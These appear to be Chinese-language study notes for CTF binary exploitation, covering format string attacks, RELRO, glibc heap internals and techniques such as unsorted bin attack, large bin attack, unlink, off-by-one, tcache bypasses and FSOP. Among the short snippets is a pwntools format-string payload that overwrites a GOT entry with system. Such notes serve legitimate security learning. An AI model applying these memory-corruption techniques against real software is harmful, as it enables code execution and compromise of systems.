<p>变量 a 为 unsigned int 类型，长度为 4 个字节，能表示的最大值为 0xFFFFFFFF，而 0x100000000 =  0xFFFFFFFF + 1，占用33位，已超出 a 所能表示的最大值，所以发生了溢出，导致最高位的 1 被截去，剩下的 32  位都是0。也就是说，a 被存储到内存后就变成了 0，printf 从内存中读取到的也是 0。</p>
<p>变量 b 是 int 类型的有符号数，在内存中以补码的形式存储。0xffffffff 的数值位的原码为 1111 1111 …… 1111 1111，共 32 位，而 int 类型的数值位只有 31 位，所以最高位的 1 会覆盖符号位，数值位只留下 31 个 1，所以 b  的原码为：<br> 1111 1111 …… 1111 1111</p>
<p>这也是 b 在内存中的存储形式。</p>
<p>当 printf 读取到 b 时，由于最高位是 1，所以会被判定为负数，要从补码转换为原码：<br> [1111 1111 …… 1111 1111]补<br> = [1111 1111 …… 1111 1110]反<br> = [1000 0000 …… 0000 0001]原<br> = -1</p>
<p>最终 b 的输出结果为 -1。</p>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p><strong>使用条件</strong>：有printf/scanf函数，且函数第一个参数可以控制</p>
<blockquote>
<p> 可以读写任意地址内存</p>
</blockquote>
<p><strong>printf</strong>:</p>
<p>sprintf(char *str, const char *format,…):sprintf(str,”a = %d”,1)  puts(str)    输出a = 1</p>
<p>%p  输出栈上的地址</p>
<p>%s  输出栈上地址指向的值</p>
<p>%n  和%s一样不过是写入已打印字符的个数，32位写四个字节，64位写8个字节，可以用%hn（写入2(4)个字节）%hhn（1(2)个字节）</p>
<p>%2048c%n 写入0x800，甚至更大，因此可以写入地址。利用两个%hn可以写入地址,在写地址时，要注意前面已经输出的字符的个数。</p>
<p>%3$d  输出第三个参数</p>
<p>对于32位程序来说，参数在栈中，但对于64位程序来说，前六个参数在寄存器中。</p>
<p>可以利用%p来确定参数的偏移，从1开始数，数到第几个出现所输入的字符串   %第几个$p</p>
<p>如果栈上的地址不指向任何值，程序会报错</p>
<p>模板：<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210408203206050.png" alt="image-20210408203206050"></p>
<p><strong>scanf</strong>:当第一个参数可控时，我们就可以仿照printf函数，将第一个参数写为%s、%p等等，唯一的区别就是%p也是改写栈上的指针指向的值(scanf中的全部都是改写栈上的指针指向的值)。%n是写入以写入字符的个数（64位写4个字节）。</p>
<p>对于%[],这个是正则表达式，%[^\n]表示不接受到\n就不会停止，对于scanf来说原本收到空格也会停止，但用了其之后，只有收到\n才会停止读入。%[A]只读A，第一个不是A的字符之后包括本身都放入缓冲区中。</p>
<p><strong>fmtstr模块</strong>:fmtstr_payload(offset,writes,numbwritten=0,write_size=’byte’) 自动生成脚本</p>
<blockquote>
<p>offset(int) ：程序的偏移量，使用%p%p%p%p……确定</p>
<p>writes：格式为{addr：value，addr2：value2}，用于往addr里写入value的值</p>
<p>numbwritten：已经由printf函数写入的字节数</p>
<p>write_size：指定是逐byte写入还是逐int写入，即（hhn，hn，n）</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">payload += fmtstr_payload(8, &#123;strlen_got : system_addr&#125;,10)</span><br></pre></td></tr></table></figure>



<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><ul>
<li>.plt :位于代码段，是一个数组，每个条目占16个字节，PLT[0]用于跳转到动态链接器，PLT[1]用于调用系统启动函数__libc_start_main()，从PLT[2]开始就是被调用的各个函数条目。</li>
<li>.plt.got：暂时不清楚。</li>
<li>.got：全局偏移表，这是链接器为外部符号填充的实际偏移表。（Partial RELRO或Full RELRO开启时为只读）</li>
<li>.got.plt：位于数据段，也是一个数组，每个条目占8个字节。GOT[0]和GOT[1]包含动态链接器在解析函数地址时所需要的两个地址（.dynamic 和 relor条目），GOT[2]是动态链接器ld-linux.so的入口点（也就是动态链接器的_dl_runtime_resolve()函数），从GOT[3]（为__libc_start_main()函数地址）开始就是被调用的各个函数条目，这些条目内容默认指向对应的PLT条目的第二条指令，延迟绑定完成后就会被修改为函数实际地址。</li>
</ul>
<p>RELRO有两种形式，<strong>Partial RELRO</strong>：一些段（包括.dynamic、.got等）在初始化后将会被标记为只读。<strong>Full RELRO</strong>：延迟绑定将被禁止，所有导入符号将在开始时被解析，.got.plt段会被完全初始化为目标函数的最终地址，并被mprotect标记为只读。</p>
<h3 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a>canary保护</h3><p>程序开启canary保护后，当程序出现栈溢出是执行<code>__stack_chk_fail</code></p>
<h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><ul>
<li>operator new(0x88uLL) 申请一个堆块相当于malloc(0x88)</li>
<li>operator delete(*ptr,0x88) 释放一个堆块</li>
</ul>
<h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p><strong>使用条件</strong>：</p>
<p>申请内存的系统调用：brk、mmap</p>
<p>brk：从data段开始向上申请内存（主线程较小时）</p>
<p>mmap：直接获取内存（子线程或主线程较大时），如果我们申请的堆足够大，malloc就会使用mmap来分配内存，而mmap分配的内存靠近libc，与libc的偏移是固定的，那么，我们就能计算出libc地址</p>
<p>chunk：堆管理器管理内存的最小单位，用户获取内存的最小单位</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201217195700784.png" alt="image-20201217195700784"></p>
<p>freechunk</p>
<p>large bin freechunk</p>
<p>fast bin freechunk</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201217202453262.png" alt="image-20201217202453262"></p>
<ul>
<li><p>prev size的复用</p>
<p>malloc(0xn8)  malloc(0xn0) 分配得到的内存空间相同，因为分配的malloc chunk一定不是freechunk又prev size是freechunk的大小，所以prev size暂时没用，可以被复用</p>
<p>被复用的prev size不算前一个chunk的大小。</p>
</li>
<li><p>bins</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201226105958044.png" alt="image-20201226105958044"></p>
</li>
</ul>
<h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p><strong>calloc</strong>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">0xA0</span>uLL, <span class="number">1uLL</span>)分配<span class="number">0xa0</span>个元素，每个元素占<span class="number">1</span>个字节</span><br><span class="line"></span><br><span class="line"><span class="comment">/*calloc不会从tcache bin里取空闲的chunk，而是从fastbin里取，取完后，和malloc一样，如果fastbin里还有剩余的chunk，则全部放到对应的tcache bin里取，采用头插法*/</span>libc<span class="number">-2.29</span>以上版本</span><br></pre></td></tr></table></figure>

<p> <strong>realloc</strong>:</p>
<p>realloc 函数可以身兼 malloc 和 free 两个函数的功能 .。</p>
<ul>
<li>当realloc(ptr,size)的size不等于ptr的size时<ul>
<li>如果申请size&gt;原来size<ul>
<li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li>
<li>如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size)</li>
</ul>
</li>
<li>如果申请size&lt;原来size<ul>
<li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li>
<li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>当realloc(ptr,size)的size等于0时，相当于free(ptr)，且返回0。</li>
<li>当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li>
</ul>
<p><strong>最小chunk</strong>：两倍字长的块，32位8字节，64位16字节，分配出的最小chunk大小为0x20(32位我猜测是0x10)。</p>
<p><strong>main_arena泄露libc地址</strong>：</p>
<p>unsorted bin只有一个bin,  其中保存的块大小不定, 用于收集刚刚被free 或从大的块中分裂剩下的块。unsortbin的fd和bk指向自身main_arena+88（libc-2.26后为96）中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。又因为 main_arena在__malloc_hook的下方0x10处，libc中有 __malloc_hook 函数，利用<code>libc_base = malloc_hook - libc.sym[&#39;__malloc_hook&#39;]</code> 即可的libcbase</p>
<p><strong>malloc_hook</strong>（__malloc_hook）:</p>
<p> malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转 </p>
<p><strong>malloc_hook - 0x23</strong>:</p>
<p> 假如,我们的块从图中的0x 7F535F744AED处开始，那么0x 7F535F744AED + 8 =  7F535F744AF5正好是块的size域,由于size域是8字节空间，图中，它后面都是0，因此它的值就是7F，由于fastbin在malloc时，只检查size域，因此，我们可以把0x 7F535F744AED(注意这个地址是随机的，但是它位于**__malloc_hook – 0x23**处 </p>
<p><strong>main_arena = malloc_hook + 0x10</strong></p>
<p><strong>fastbin不会清空nextchunk的prev_inuse</strong></p>
<p><strong>从fastbins中malloc一个freechunk做的检查</strong>：</p>
<p>检测1：检测malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例：一个fastbin链储存的chunk大小在0x30~0x40之间，但要申请的这个chunk却是0x50，那么就会报错）（只验证当前chunk是否与链表头部chunk相同，size域是否相等）</p>
<p>检测2：检测freechunk的size成员的PREV_INUSE是否为1，为1才可以通过检测</p>
<p><strong>realloc_hook</strong>（__realloc_hook）:</p>
<p>与malloc_hook相邻（地址差0x8）， 将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处（偏移分别为0，2，4，6，8，9）。<em>6和8间使栈下移了0x10</em>（疑问）push和pop的次数是一致的，若push次数减少则会压低堆栈，改变栈环境。</p>
<p>通过调试（先进入malloc或realloc函数中，当遇到execve函数时，查看他的rsi/esi寄存器中是否存放的数据是0） </p>
<p>realloc函数（__libc_realloc）  libc.got[‘realloc’]  realloc_hook中存有值，可以对其地位修改利用。</p>
<p>例：roarctf_2019_easy_pwn</p>
<p><strong>free_hook</strong>(__free_hook):</p>
<p>当onegadget无效时，就可以利用system等函数，将函数的真实地址写入__free_hook中，同时再将参数地址写入free的指针中。</p>
<h3 id="main-arena"><a href="#main-arena" class="headerlink" title="main_arena"></a>main_arena</h3><p>main_arena结构：</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210425190724564.png" alt="image-20210425190724564"></p>
<p>当unsortedbin中存在多个freechunk时，其对应的bins数组的值不同。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210425192952079.png" alt="image-20210425192952079"></p>
<p>如果只存在一个freechunk，则对应的bins数组值相同。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210425195608057.png" alt="image-20210425195608057"></p>
<p><strong>注意</strong>：freechunk的fd和bk指针并不指向对应的bin数组，而是指向对应bin数组的前两个格。unsortedbin与smallbin的0x20相临，且都站2个格（即0x10大小）</p>
<h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping chunks"></a>overlapping chunks</h3><p><strong>使用条件</strong>：存在堆溢出漏洞</p>
<p>利用：</p>
<ul>
<li>扩展被释放块：分配三个chunk，释放第二个chunk，利用第一个chunk的堆溢出漏洞修改已被free的第二个chunk的size域为 第二个chunk大小+第三个chunk大小，在申请大小为 第二个chunk大小+第三个chunk大小 的chunk使堆块重叠。<strong>如果chunk的size并不等于请求大小，例：设置size为0x120，申请malloc(0xe0)。此时0x120大小的chunk首先被整理回small bin中，然后切分出0xf0大小的空间，剩下的作为last_ rema inder，在这个过程中使用了unlink函数，需要绕过。</strong></li>
<li>扩展已分配块：向后合并是通过prev_size获得低地址的chunk并将其unlink（<strong>可以先将低地址的部分（只要让其fd和bk指针指向main_arena+96（88））堆块释放，但要注意不能在高地址堆块的prev_size和prev_in_use都布置好后释放低地址堆块，因为布置好后就认定低地址的堆块已被释放，再次释放会报prev_size错误</strong>）；向前合并是通过size获得高地址的chunk并将其unlink。攻击过程中所需要绕过的检查主要就是unlink。例：p1：szie：0x21（有overflow漏洞） p2：size：0x91 p3：size：0x91 p4：size：0x91 p5：size：0x21    free（p4），改p2大小为0x121，free（p2）就会获得一个大小为0x1b1的freechunk（在释放p2时，找到next chunk为p4，p4是freechunk，于是通过unlink将p4从unsorted bin中取出，将他们合并后放回unsorted bin）</li>
</ul>
<h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin dup consolidate"></a>fastbin dup consolidate</h3><p><strong>原理</strong>：libc在分配large chunk时，如果fastbins不为空，则调用malloc_consolidate()函数合并里面的chunk，并放入unsorted bin，接着，unsorted bin中的chunk又被取出放回各自对应的bins（small bin或large bin）。此时，fastbins已被清空，再次释放相同的chunk时就不会出发二次释放。</p>
<p><em>利用</em>：申请两个小chunk，第二chunk防止freechunk与topchunk合并。free第一个chunk进入fastbins中，接着malloc（0x400），分配一个large chunk，fastbins不为空，取出fastbins中的freechunk进入unsorted bin中，freechunk的fd和bk指针被赋上main_arena+88，紧接着被放入small bin中，fastbins中无chunk，此时在free第一个chunk，进入fastbins中，fd指针被置0，但bk指针还是指向main_arena+88。这是，一个freechunk即存在与fastbins中也存在于smallbin中。</p>
<p>malloc_consolidate()过程：</p>
<ul>
<li><p>若 get_max_fast() 返回 0，则进行堆的初始化工作，然后进入第 7 步</p>
</li>
<li><p>从 fastbin 中获取一个空闲 chunk</p>
</li>
<li><p>尝试向后合并</p>
</li>
<li><p>若向前相邻 top_chunk，则直接合并到 top_chunk，然后进入第 6 步</p>
</li>
<li><p>否则尝试向前合并后，插入到 unsorted_bin 中</p>
</li>
<li><p>获取下一个空闲 chunk，回到第 2 步，直到所有 fastbin 清空后进入第 7 步</p>
</li>
<li><p>退出函数</p>
</li>
</ul>
<h3 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted bin into stack"></a>unsorted bin into stack</h3><p><strong>使用条件</strong>：可以修改freechunk的bk指针，也可以修改freechunk的size大小</p>
<p><em>原理</em>：当请求的chunk大小在fastbins和small bins中无法满足时，就会进入一个for循环，按照先进先出的方式遍历unsortedbin，如果unsortedbin中也没有满足要求，则将unsortedbin中的chunk取出并整理回对应的bins中，进行下一轮循环。</p>
<p>利用：malloc两个chunk，第二个chunk的作用是防止freechunk与topchunk合并。在栈上构造一个fakechunk，其size域填上我们下次要malloc的大小，bk指针设置成任意一个可写地址（有tcache时，只能将bk指针指向fakechunk本身，以达成循环链表填满tcache）。free第一个申请的chunk，进入unsortedbin中，这时，修改他的bk指针指向fakechunk，并且修改size域大小使其不满足接下来用户要申请的大小（最好小于申请的大小。（问题：能不能大于申请的大小？（答：不能，如果大于，则unsorted会被切分）））。申请一个和fakechunk一样大的chunk，这时，会遍历unsortedbin寻找相同大小的freechunk （unsortedbin是先进先出原则），因，第一个被free掉的chunk的size域被修改，因此不满足要申请的大小，会将此freechunk放回所属的bins中，再依据其bk指针寻找它的上一个freechunk即fakechunk，因大小满足，直接返回给用户，因此就得到了栈的控制权。</p>
<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p><strong>使用条件</strong>：可以修改freechunk的bk指针，但不能修改freechunk的size大小</p>
<p><em>原理</em>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>



<p>利用：申请一个释放后能放入unsortedbin中的chunk，再申请一个chunk（防止与topchunk合并），free此chunk进入unsortedbin中，修改其bk指针，指向目标地址-16，在malloc一个一样大小的chunk，这时，目标地址就会被写入unsortedbin的地址，造成任意地址写，但是写入的值是我们并不能控制的（值为unsorted bin的地址）。</p>
<p>当存在tcache时，malloc从unsorted bin取出chunk时，如果对应的tcache bin未装满，则会将unsorted bin里的chunk全部放进tcachebin，因此需要使用tcache poisoning技术将tcache counts修改为0xff，就能绕过tcache，将unsorted bin的地址写入目标内存。</p>
<p><strong>作用</strong>：为进一步的攻击辅助例如泄露libc地址，或修改全局变量global_max_fast，使更大的chunk被视为fastbin</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210428170006717.png" alt="image-20210428170006717"></p>
<ul>
<li>unsorted bin into stack 与 unsorted bin attack 的区别：前者是修改了freechunk的size大小使malloc时得到的是它的bk指针指向的chunk；后者是freechunk被malloc拿走后，它的bk指针所指向的地址被放入unsorted  bin中，造成地址写入。</li>
</ul>
<h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h3><p><strong>使用条件</strong>：</p>
<p><em>原理</em>：large bin的每个bin所存储的chunk并不一定是大小相同的，而是处于一定的范围内，然后通过指针fd_nextsize按从大到小的顺序进行排列。同样的，换成bk_nextsize就是按从小到大的顺序排列。</p>
<p>  <img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210415212139462.png" alt="image-20210415212139462"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210415212236480.png" alt="image-20210415212236480"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210415212253520.png" alt="image-20210415212253520"></p>
<p>利用：分配三个chunk：p1，p2，p3其中p2和p3是largechunk（大小相同），p1用于切分堆块，还得插入其他的小chunk防止释放时合并。先释放p1、p2，都进入unsorted bins中，接着malloc一个比p1小的chunk，此时，会进行如下操作：</p>
<ul>
<li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li>
<li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li>
<li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li>
<li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li>
<li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li>
</ul>
<p>这样p2就被放入largebins中，释放p3，被放入unsortedbin中，<strong>然后修改p2的size，是其小于p3的size，再修改p2的bk指针指向&amp;stack1-2，bk_nextsize指针指向&amp;stack2-4</strong>，再次分配一个比切分过后的chunk还小的chunk ，p3被整合到largebin中，此时，栈上的stack1和stack2就被修改了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize//fwd就是p2</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"></span><br><span class="line">addr2-&gt;fd_nextsize = victim;</span><br><span class="line">// 等价于</span><br><span class="line">*(addr2+4) = victim;//因此stack2被修改</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">// ......</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line">// 等价于</span><br><span class="line">(fwd-&gt;bk)-&gt;fd = victim;</span><br><span class="line">// 等价于</span><br><span class="line">*(addr1+2) = victim;//stack1被修改</span><br></pre></td></tr></table></figure>



<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><strong>使用条件</strong>：libc-2.29后，对unsortbin中的解链添加了检查，不能使用unlink，如果可以知道&amp;chunk的值， 就可以使用unlink。libc-2.26新增了对nextchunk的prev_size域的检查。</p>
<p><em>原理</em>：为了避免堆内存过度碎片化，<strong>当一个chunk（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，若果是，则将前面或后面的堆块从bins中取出（取出后bins中便无libc），并与当前堆块合并</strong>这个取出的过程就是unlink。</p>
<p>重要的四句代码<code>FD=P-&gt;fd;BK=P-&gt;bk;FD-&gt;bk=BK;BK-&gt;fd=FD</code>假设有chunk0_ptr且存在某个漏洞能修改和它相邻的chunk1的prevsize和prev_inuse，就可以通过设置prevsize和将pre_inuse设置为0，就能在chunk0中构造一个fakefreechunk然后free掉chunk1触发chunk0的unlink，从而修改chunk0_ptr为&amp;chunk0_ptr-3</p>
<p>利用：先malloc一个0x90大小的chunk0和chunk1，再(FD)chunk0[2]=&amp;chunk0_ptr-3,(BK)chunk0_ptr[3]=&amp;chunk0_ptr-2,修改chunk1的prevsize域为0x80和prev_inuse为0，再free掉chunk1，这时出发unlink，又因为最后一句代码<code>BK-&gt;fd=FD</code>即<code>P-&gt;bk-&gt;fd=P-&gt;fd</code>,FD的值为&amp;chunk0_ptr-3,P-&gt;bk-&gt;fd的值为P（即chunk0_ptr）被替换为&amp;chunk0_ptr-3,即造成任意地址写入。</p>
<p><strong>使用unlink注意tcahe中的chunk不能合并</strong>，不仅fakechunk不能在tcache或fastbin中，和fakechunk相邻的chunk也不能在tcache或fastbin中。</p>
<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><ul>
<li>扩展被释放快：当溢出堆块的下一个堆块为被释放块且处于unsorted bin中时，可以通过溢出一个字节来扩大其size域，下次分配取出此块时，其后的堆块将被覆盖，造成堆块重叠。</li>
<li>扩展已分配堆块：当溢出堆块的下一堆块处于使用中时，则单字节溢出需要合理设置size域大小，使堆块被释放时的合并操作能够顺利进行。</li>
<li>收缩被释放块：poison null byte，针对溢出字节只能为0的情况。通过溢出可以将写一个被释放堆块的size缩小，则在接下来的分配中，下一个堆块的prev_size域无法得到正确的更新，在该堆块被释放时，依然根据原prev_size域找到上一个被释放块合并，造成堆块重叠。</li>
</ul>
<h3 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//glibc-2.29</span><br><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">  /* This field exists to detect double frees.  */</span><br><span class="line">  struct tcache_perthread_struct *key;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>当free一个chunk时，会遍历检查tcache中的chunk的key指针是否是指向tcache（即heap_base+0x10）,因此就不能使用doublefree，但可以通过修改key值来绕过。</p>
<h3 id="glibc2-30"><a href="#glibc2-30" class="headerlink" title="glibc2.30"></a>glibc2.30</h3><p>对counts做检查，如果counts为0，则不从tcache取freechunk</p>
<h3 id="glibc2-32上的保护"><a href="#glibc2-32上的保护" class="headerlink" title="glibc2.32上的保护"></a>glibc2.32上的保护</h3><p>将放入tcache的chunk的fd指针上的内容进行了加密，将((key&gt;&gt;12)^fd指向的下一个chunk地址)放入fd指针，当tcache内只有一个chunk时，key&gt;&gt;12异或0，即可以泄露(key&gt;&gt;12),同时可以获得heap_base（key&gt;&gt;12&lt;&lt;12）</p>
<p>tcache_struct的大小变成了0x291，因为counts的大小翻了一倍。原来是每个counts占一个字节，现在占两个字节。</p>
<p>当counts为0时，无论其后有无freechhunk，都不会分配出去。</p>
<h3 id="IO-FILE结构"><a href="#IO-FILE结构" class="headerlink" title="_IO_FILE结构"></a>_IO_FILE结构</h3><p><strong>FILE结构</strong>:<a href="file:///D:/%E6%A1%8C%E9%9D%A2/%E6%9C%AC%E5%9C%B0%E7%BD%91%E9%A1%B5/FILE%E7%BB%93%E6%9E%84/FILE%E7%BB%93%E6%9E%84%20-%20CTF%20Wiki.html">FILE结构</a></p>
<ul>
<li><p>printf/puts 最终会调用_IO_file_xsputn</p>
</li>
<li><p>fclose 最终会调用_IO_FILE_FINISH</p>
</li>
<li><p>fwrite最终会调用_IO_file_xsputn</p>
</li>
<li><p>fread 最终会调用_IO_fiel_xsgetn</p>
</li>
<li><p>scanf/gets最终会调用_IO_file_xsgetn</p>
</li>
</ul>
<p><strong>注意</strong>：在调用printf函数时，会进入vfprintf函数，当运行到如下图所示的位置时，先会将rdx赋上_IO_file结构体0x88偏移处的_lock的值，然后取对其值+8地址处的值与r8比较是否相等相等就跳到vfprintf+425的位置。而我们则需要让其不相等。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210426182256010.png" alt="image-20210426182256010"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210426182914323.png" alt="image-20210426182914323"></p>
<p>下图表示_IO_file结构体0x88偏移处的_lock的值必须是具有可写的权限。cmpxchg如果两个操作数相等第二个数 赋值给第一个，反之相反。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210426183936404.png" alt="image-20210426183936404"></p>
<p>如果_mode的值不为-1，就不会调用vtable中的虚表了，但_mode也可以为0，为0时，他会以其他方式调用vtable中的虚表。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210426210509846.png" alt="image-20210426210509846"></p>
<p><strong>伪造vtable劫持程序流</strong>：<a href="file:///D:/%E6%A1%8C%E9%9D%A2/%E6%9C%AC%E5%9C%B0%E7%BD%91%E9%A1%B5/fakevtable/%E4%BC%AA%E9%80%A0vtable%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B%20-%20CTF%20Wiki.html">点这里</a> <strong>由上面可知，在伪造vtable时，需要注意IO_FILE中的_lock的值必须是具有可写权限并能访问的到的地址，且_mode的值必须为0或-1</strong>，其余值为任意值都行（后续碰到有什么限制再加）。</p>
<p><strong>FSOP</strong>：_IO_list_all在libc中，它是指向结构体的指针，大小为8字节（64位），其值为_IO_2_1_stderr_的地址, <code>_IO_list_all-&gt;stderr-&gt;stdout-&gt;stdin</code>构成链表 （stderr、stdout、stdin都是指向FILE结构体的指针）。<a href="file:///D:/%E6%A1%8C%E9%9D%A2/%E6%9C%AC%E5%9C%B0%E7%BD%91%E9%A1%B5/FSOP/FSOP%20-%20CTF%20Wiki.html">FSOP</a>，可以通过_IO_2_1_stdout_来修改vtable指针（调用printf函数时，会使用stdout最终调用_IO_xsputn_t                           ）。也可以通过调用_IO_flush_all_lockp()函数触发（触发条件为：1、当libc检测到内存错误执行abort流程时 2、执行exit函数时 3、当main函数返回时）此时就需要劫持_IO_list_all，使其指向伪造的_IO_FILE_PLUS（伪造是需满足mode&lt;=0和write_prt&gt;write_base）和伪造的vtable。<strong>覆盖__overflow为system的函数地址（比如system的got地址）</strong></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210421154310013.png" alt="image-20210421154310013"></p>
<p><strong>FSOP(libc-2.24)</strong>:<a href="file:///D:/%E6%A1%8C%E9%9D%A2/%E6%9C%AC%E5%9C%B0%E7%BD%91%E9%A1%B5/2.24FSOP/glibc%202.24%E4%B8%8B%20IO_FILE%20%E7%9A%84%E5%88%A9%E7%94%A8%20-%20CTF%20Wiki.html">2.24</a> 可以利用_mode&gt;0使其不满足判断条件，让fp=fp-&gt;chain来达到可控的区域。mode偏移为0xc0。</p>
<p>IO_FILE与缓冲区的相关利用。</p>
<p><strong>利用stdout泄露libc</strong>：利用pwndbg查看stdout结构体的地址（后3位位620，且和main_arena的地址的后四位不一样），在上方0x43处有有0x7f可以利用此地址上的值构造一个大小为0x70的fakechunk，再将stdout地址上的值改为0xfbad1887（00）+p64(0)*3 +’\x88‘(‘’\x00’)(最后一个字节调试而来，并不确定，即为stdin的地址，18个字节的0覆盖了_IO_read_ptr、_IO_read_end、_IO_read_base指针。_IO_write_base指针作用是从哪开始打印，_IO_write_ptr是打印到哪结束)，因后三位确定，所以只有1/16的概率</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210405152335132.png" alt="image-20210405152335132"></p>
<p>（_IO_2_1_stdin_）</p>
